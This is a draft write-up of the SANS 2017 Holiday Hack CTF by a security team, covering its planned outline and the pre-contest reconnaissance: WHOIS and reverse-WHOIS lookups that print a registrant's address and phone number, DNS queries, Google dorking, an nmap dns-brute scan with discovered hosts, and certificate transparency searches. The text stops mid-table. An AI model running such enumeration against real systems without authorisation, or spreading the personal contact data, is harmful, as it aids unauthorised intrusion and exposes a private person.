<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SANS 2017 Holiday Hack Writeup</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="Vlad Grigorescu" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/readtheorg.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/readtheorg.js"></script>
<style>#content{max-width:1200px;}</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2017 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        displayAlign: "center",
        displayIndent: "0em",

        "HTML-CSS": { scale: 100,
                        linebreaks: { automatic: "false" },
                        webFont: "TeX"
                       },
        SVG: {scale: 100,
              linebreaks: { automatic: "false" },
              font: "TeX"},
        NativeMML: {scale: 100},
        TeX: { equationNumbers: {autoNumber: "AMS"},
               MultLineWidth: "85%",
               TagSide: "right",
               TagIndent: ".8em"
             }
});
</script>
<script type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
</head>
<body>
<div id="content">
<h1 class="title">SANS 2017 Holiday Hack Writeup</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#org2c56b36"><span class="todo TODO">TODO</span> </a>
<ul>
<li><a href="#orgfaa4938">Overall approach</a></li>
<li><a href="#org685e20a">Introduction</a></li>
<li><a href="#org49e87e5">Answers</a></li>
<li><a href="#org4e9cdb5">Pre-contest Reconnaissance</a></li>
<li><a href="#org8354cdf">Terminals and Servers</a></li>
<li><a href="#orga8e2579">Easter Eggs</a></li>
<li><a href="#org74a3cd5">Snowball Game</a></li>
</ul>
</li>
<li><a href="#org494e540">Introduction</a></li>
<li><a href="#org5e9887d">tl;dr: Quick Answers</a></li>
<li><a href="#org029804f">Pre-contest Reconnaissance</a>
<ul>
<li><a href="#orge15bb75">Whois Searching</a></li>
<li><a href="#org669c156">DNS Brute Forcing</a></li>
<li><a href="#org125f28f">Certificate Transparency Logs</a></li>
<li><a href="#org2591284">Monitoring</a></li>
<li><a href="#org7e02a0d">Recon Summary</a></li>
</ul>
</li>
<li><a href="#org1bf9e8a">Terminals</a>
<ul>
<li><a href="#org1688e9e">Bumble's Bounce</a></li>
<li><a href="#org8dd3295">Cryokinetic Magic</a></li>
<li><a href="#org8fcc336">I Don't Think We're In Kansas Anymore</a></li>
<li><a href="#org16b135d">Oh Wait Maybe We Are</a></li>
<li><a href="#orgf22753e">There's No Place Like Home</a></li>
<li><a href="#org401e86b">We're Off To See The</a></li>
<li><a href="#org704bdc4">Winconceivable The Cliffs Of Insanity</a></li>
<li><a href="#org2f7febe">Winter Wonder Landing</a></li>
</ul>
</li>
<li><a href="#org9ea9753">Answers</a>
<ul>
<li><a href="#orgf47e261">Question 1</a></li>
<li><a href="#org5ab4121">Question 2</a></li>
<li><a href="#org43ed5d1">Question 3</a></li>
<li><a href="#org3f356a0">Question 4</a></li>
<li><a href="#org3bbdc4a">Question 5</a></li>
<li><a href="#org0c39089">Question 6</a></li>
<li><a href="#orgb4b3f6f">Question 7</a></li>
<li><a href="#org877a271">Question 8</a></li>
<li><a href="#org3f0fba9">Question 9</a></li>
</ul>
</li>
<li><a href="#org2a30f35">Misc/TODO</a>
<ul>
<li><a href="#org735e341">Let the Hack Begin!</a></li>
<li><a href="#org1d65fe1">Using ripgrep</a></li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-org2c56b36" class="outline-2">
<h2 id="org2c56b36"><span class="todo TODO">TODO</span> </h2>
<div class="outline-text-2" id="text-org2c56b36">
</div>
<div id="outline-container-orgfaa4938" class="outline-3">
<h3 id="orgfaa4938">Overall approach</h3>
<div class="outline-text-3" id="text-orgfaa4938">
<p>
Each question should have:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> A reference solution</li>
<li class="off"><code>[&#xa0;]</code> An overview of the thought process and what we tried that led to that solution, <b>and what we tried that didn't work</b></li>
<li class="off"><code>[&#xa0;]</code> Some other ways that we could've solved it</li>
<li class="off"><code>[&#xa0;]</code> A peak behind the curtain of how the challenge worked, and perhaps a better defense that would've mitigated the attack</li>
</ul>
</div>
</div>
<div id="outline-container-org685e20a" class="outline-3">
<h3 id="org685e20a">Introduction</h3>
<div class="outline-text-3" id="text-org685e20a">
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Write a paragraph about our approach to the challenge, what everyone did, etc.</li>
<li class="off"><code>[&#xa0;]</code> Write a paragraph about the outline and presentation of the report ("We first lay out the solutions, then we show some other ways that we solved it, then we try to peak behind the curtain of how the challenges worked&#x2026;")</li>
</ul>
</div>
</div>
<div id="outline-container-org49e87e5" class="outline-3">
<h3 id="org49e87e5">Answers</h3>
<div class="outline-text-3" id="text-org49e87e5">
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Write short answers to each of the questions</li>
<li class="off"><code>[&#xa0;]</code> Link to where they can read more about the answers (maybe link to the "reference solution," and the "going further solution" for each)</li>
</ul>
</div>
</div>
<div id="outline-container-org4e9cdb5" class="outline-3">
<h3 id="org4e9cdb5">Pre-contest Reconnaissance</h3>
<div class="outline-text-3" id="text-org4e9cdb5">
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Update the recon to talk about the changes that they made (hid some stuff in DNS, etc.)</li>
</ul>
</div>
</div>
<div id="outline-container-org8354cdf" class="outline-3">
<h3 id="org8354cdf">Terminals and Servers</h3>
<div class="outline-text-3" id="text-org8354cdf">
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Reference solutions for solving each challenge</li>
<li class="off"><code>[&#xa0;]</code> Thought process for solving each challenge</li>
<li class="off"><code>[&#xa0;]</code> Alternative ways to solve each challenge
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> EWA Server: Downloaded all the e-mails</li>
<li class="off"><code>[&#xa0;]</code> EMI Server: Got Meterpreter working</li>
<li class="off"><code>[&#xa0;]</code> Terminals: Reverse the binaries?</li>
</ul></li>
<li class="off"><code>[&#xa0;]</code> Discuss how each challenge was setup
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> EMI Server: Discuss the alabaster_snowball.py Python script</li>
</ul></li>
<li class="off"><code>[&#xa0;]</code> AsciiCinema solution to each terminal?</li>
</ul>
</div>
</div>
<div id="outline-container-orga8e2579" class="outline-3">
<h3 id="orga8e2579">Easter Eggs</h3>
<div class="outline-text-3" id="text-orga8e2579">
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> List references and any hidden data we found
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> The example Hash</li>
<li class="off"><code>[&#xa0;]</code> nppd robots.txt</li>
<li class="off"><code>[&#xa0;]</code> LDAP passwords</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org74a3cd5" class="outline-3">
<h3 id="org74a3cd5">Snowball Game</h3>
<div class="outline-text-3" id="text-org74a3cd5">
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Videos to solving each level?</li>
<li class="off"><code>[&#xa0;]</code> Hacking the game?</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org494e540" class="outline-2">
<h2 id="org494e540">Introduction</h2>
<div class="outline-text-2" id="text-org494e540">
<p>
We're the Security team at the National Center for Supercomputing
Applications, and we worked together on yet another fun SANS Holiday
Hack, like we did last year. Over the past year, we've been surprised
to see how many skills and tricks from the 2016 Holiday Hack we used
for our jobs.
</p>

<p>
We've done "red-team" work such as code reviews and pen-tests, where
we encountered insufficient PHP input sanitization, development files
being left in production, and services being unintentionally
exposed. Our role in these instances is to find these issues before
someone malicious does, and to help and educate our users to
understand and prevent this from reoccuring. Other work we do is in
architecting defenses and mitigations. How do we secure systems and
services, while being as transparent as possible to end-users?
</p>

<p>
As we do red-team work, it's useful to try to think like a defender:
"How would <b>I</b> have secured this system, and are there any ways around
that?" Similarly, as we do blue-team work, we need to know the methods
and tools that an attacker would use. With that in mind, our approach
to this year's Holiday Hack is to solve the challenges, but also to
try to offer some insight into Alabaster Snowball's defenses. Where
possible, we offer some alternatives that he could've used which
would've been more secure.
</p>
</div>
</div>
<div id="outline-container-org5e9887d" class="outline-2">
<h2 id="org5e9887d">tl;dr: Quick Answers</h2>
</div>
<div id="outline-container-org029804f" class="outline-2">
<h2 id="org029804f">Pre-contest Reconnaissance</h2>
<div class="outline-text-2" id="text-org029804f">

<div class="figure">
<p><img src="./images/sans_holiday_hack_preview.png" alt="sans_holiday_hack_preview.png" />
</p>
<p><span class="figure-number">Figure 1: </span>SANS Holiday Hack Challenge December 5th Update</p>
</div>

<p>
On December 5th, the SANS Holiday Hack Challenge was updated to tell
us that the 2017 Hack was coming soon, and encouraging us to catch up
on past challenges. The next day, we started doing just that. In
addition to reviewing previous challenges, we also began some
reconnaissance for the 2017 challenge.
</p>

<p>
Recon is a crucial step of any good penetration test, and is one that
often gets skipped in a "Capture the Flag" type of competition, since
most of the information is provided. Nevertheless, let's see what we
can find. The more information we have ahead of time, the better
prepared we'll be, and the less work we'll have to do during the
actual contest.
</p>

<p>
Much like how attackers will have indicators of compromise (IOCs)
which allow us to track and follow an individual attacker, the Counter
Hack team also does similar things every year, and will leave behind
some clues.
</p>
</div>

<div id="outline-container-orge15bb75" class="outline-3">
<h3 id="orge15bb75">Whois Searching</h3>
<div class="outline-text-3" id="text-orge15bb75">
<p>
For example, the 2016 contest made use of the domain
www.northpolewonderland.com. We can look at publicly available WHOIS
data for that domain:
</p>

<div class="org-src-container">
<pre class="src src-sh">whois northpolewonderland.com | grep Registrant
</pre>
</div>

<pre class="example">
Registrant Name: Edward Skoudis
Registrant Organization: Counter Hack
Registrant Street: 2402 Alexandra Court
Registrant City: Howell
Registrant State/Province: New Jersey
Registrant Postal Code: 07731
Registrant Country: US
Registrant Phone: +1.7327511024
Registrant Phone Ext:
Registrant Fax: +1.7327511024
Registrant Fax Ext:
Registrant Email: edskoudis@yahoo.com
</pre>

<p>
There are a few services that allow you to do a "reverse WHOIS"
search, to search for domains by WHOIS data. For instance to search
for other domains where "edskoudis@yahoo.com" shows up in the contact
info: 
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Domain Name</th>
<th scope="col" class="org-right">Creation Date</th>
<th scope="col" class="org-left">Registrar</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">northpolechristmastown.com</td>
<td class="org-right">2017-10-19</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">1hrctf.com</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">1hrctf.org</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">cranbian.org</td>
<td class="org-right">2016-11-22</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">hackfestchallenge.com</td>
<td class="org-right">2016-10-20</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">onehourctf.org</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">atnascorp.com</td>
<td class="org-right">2015-11-10</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">ginormouselectronicssupplier.com</td>
<td class="org-right">2015-12-09</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.com</td>
<td class="org-right">2015-11-02</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.org</td>
<td class="org-right">2015-11-02</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">digimeme.org</td>
<td class="org-right">2013-11-18</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">syn-pi.org</td>
<td class="org-right">2013-11-18</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">pseudovision.net</td>
<td class="org-right">2010-09-09</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">counterhack.net</td>
<td class="org-right">2001-06-22</td>
<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="org-left">skoudis.com</td>
<td class="org-right">2001-06-22</td>
<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="org-left">counterhack.com</td>
<td class="org-right">2000-05-30</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>
</tbody>
</table>

<p>
This isn't comprehensive, since northpolewonderland.com didn't show up
in the results, but cranbian.org was another domain from 2016 that
does show up.
</p>

<p>
There are a couple of new entries since the 2016 contest, 1hrctf and
northpolechristmastown.com. 1hrctf seems unrelated, but it's a good
bet that northpolechristmastown.com will show up in the 2017
challenge.
</p>

<p>
At this point, we have to proceed with extreme caution. Since the
contest hasn't started, nothing is in scope yet. Any further digging
should be as unintrusive as possible.
</p>
</div>
</div>

<div id="outline-container-org669c156" class="outline-3">
<h3 id="org669c156">DNS Brute Forcing</h3>
<div class="outline-text-3" id="text-org669c156">
<p>
Now that we have a domain we're interested in, let's look at DNS:
</p>

<div class="org-src-container">
<pre class="src src-sh">dig ANY northpolechristmastown.com
</pre>
</div>

<pre class="example">
;; ANSWER SECTION:
northpolechristmastown.com. 5	IN	TXT	"v=spf1 include:_spf.google.com -all"
northpolechristmastown.com. 5	IN	MX	30 ALT2.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	40 ASPMX2.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	20 ALT1.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	50 ASPMX3.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	10 ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	SOA	ns53.domaincontrol.com. dns.jomax.net. 2017120112 28800 7200 604800 600
northpolechristmastown.com. 5	IN	NS	ns54.domaincontrol.com.
northpolechristmastown.com. 5	IN	NS	ns53.domaincontrol.com.
</pre>

<p>
From this, we can tell that GMail provides the e-mail for the domain,
and GoDaddy provides the DNS service. Of note, however, is that there
are no A or AAAA records, so northpolechristmastown.com does not
resolve to anything.
</p>

<p>
Next, we'll try some Google dorking. Googling for
site:northpolechristmastown.com reveals
nppd.northpolechristmastown.com, which is a Sign In page for the
North Pole Police Department. It looks like nppd uses Google OAuth
for authentication, and most pages are forbidden with a regular GMail
account.
</p>

<p>
Checking a few other common URLs on nppd, we can find some resources
that are available, including favicon.ico and robots.txt:
</p>
<pre class="example">
User-agent: hk-47
Disallow: /
Disallow: /needhelp
Disallow: /infractions
Disallow: /community
Disallow: /about

User-agent: threepio
Sand-Crawler-delay: 421

User-agent: artoo
Sand-Crawler-delay: 2187
</pre>


<div class="figure">
<p><img src="./images/nppd_star.png" alt="nppd_star.png" />
</p>
<p><span class="figure-number">Figure 2: </span>North Pole Police Department Logo</p>
</div>

<p>
Everything here but /infractions is forbidden. Looking at that page
returns a list of infractions, such as "Unauthorized access to cookie
jar" or "Computer infraction: Accessing siblings files without
permission." We also see some interesting infractions that refer to
previous Holiday Hacks:
</p>

<pre class="example">
    {
        "date": "2016-12-25T00:00:00",
        "name": "Dr. Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    },
    {
        "date": "2015-12-25T00:00:00",
        "name": "Cindy Lou Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    }
],
"query": "name:Who"
</pre>

<p>
Going back to DNS&lt; we can try to enumerate some hosts under the top
level domain. FuzzDB has a nice list of common DNS name, and we can
use an nmap script to try to query those:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ nmap --script dns-brute --script-args dns-brute.domain=northpolechristmastown.com,dns-brute.threads=1,dns-brute.hostlist=fuzzdb/discovery/dns/dnsmapCommonSubdomains.txt
</pre>
</div>

<pre class="example">
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-06 18:54 CST
Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Pre-scan script results:
| dns-brute:
|   DNS Brute-force hostnames:
|     intranet.northpolechristmastown.com - 35.196.239.128
|     files.northpolechristmastown.com - 35.185.43.23
|     dev.northpolechristmastown.com - 35.185.84.51
|     admin.northpolechristmastown.com - 35.185.115.185
|_    mail.northpolechristmastown.com - 35.185.115.185
</pre>

<p>
A couple of other lists resulted in the following hostnames as well:
</p>

<pre class="example">
|   DNS Brute-force hostnames:
|     emi.northpolechristmastown.com - 35.185.57.190
|_    ewa.northpolechristmastown.com - 35.185.115.185
</pre>
</div>
</div>

<div id="outline-container-org125f28f" class="outline-3">
<h3 id="org125f28f">Certificate Transparency Logs</h3>
<div class="outline-text-3" id="text-org125f28f">
<p>
Next, let's turn our attention to the holidayhackchallenge.com
domain. Last year, there were some new hosts that appeared under this
domain (e.g. quest2016.holidayhackchallenge.com). Brute-forcing this
will likely not get us very far, so let's try a different approach:
certificate transparency logs. Many certificate authorities maintain
transparency systems, so that issued certificates can be publicly
reviewd. Symantec, for instance, has a free tool that will search the
logs of several certificate authorities:
</p>


<div class="figure">
<p><img src="./images/recon_crypto_report.png" alt="recon_crypto_report.png" />
</p>
<p><span class="figure-number">Figure 3: </span>Symantec Crypto Report for holidayhackchallenge.com</p>
</div>

<p>
Searching for holidayhackchallenge.com reveals the following
certificates that don't look familiar:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Common Name</th>
<th scope="col" class="org-left">Subject Alternate Names (SANs)</th>
<th scope="col" class="org-right">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">2017.holidayhackchallenge.com</td>
<td class="org-left">2017, puzzler2017</td>
<td class="org-right">35.196.67.150</td>
</tr>

<tr>
<td class="org-left">docker2017.holidayhackchallenge.com</td>
<td class="org-left">&#xa0;</td>
<td class="org-right">35.190.163.207</td>
</tr>

<tr>
<td class="org-left">chat.holidayhackchallenge.com</td>
<td class="org-left">&#xa0;</td>
<td class="org-right">35.196.73.180</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org2591284" class="outline-3">
<h3 id="org2591284">Monitoring</h3>
<div class="outline-text-3" id="text-org2591284">
<p>
None of the 3 servers listed above are currently accessible on port 80
or 443 (HTTP and HTTPS). We setup some monitoring using a free online
service (uptimerobot.com). Every 5 minutes, it would try to connect to
HTTP and HTTPs on the 3 servers listed above. Once the systems become
available, it will text us and post a message to our Slack channel.
</p>

<p>
Once that happens, the hack is on, and we'll be ready to hit the
ground running.
</p>
</div>
</div>

<div id="outline-container-org7e02a0d" class="outline-3">
<h3 id="org7e02a0d">Recon Summary</h3>
<div class="outline-text-3" id="text-org7e02a0d">
<p>
We can use the following indicators to search any clues we're later provided with:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Indicator</th>
<th scope="col" class="org-left">Type</th>
<th scope="col" class="org-left">Source</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">northpolechristmastown.com</td>
<td class="org-left">Domain</td>
<td class="org-left">Reverse WHOIS</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.com</td>
<td class="org-left">Domain</td>
<td class="org-left">2016 Hack</td>
</tr>

<tr>
<td class="org-left">nppd.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Google Search</td>
</tr>

<tr>
<td class="org-left">intranet.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">files.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">dev.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">admin.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">mail.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">emi.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">ewa.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">puzzler2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert SAN</td>
</tr>

<tr>
<td class="org-left">docker2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
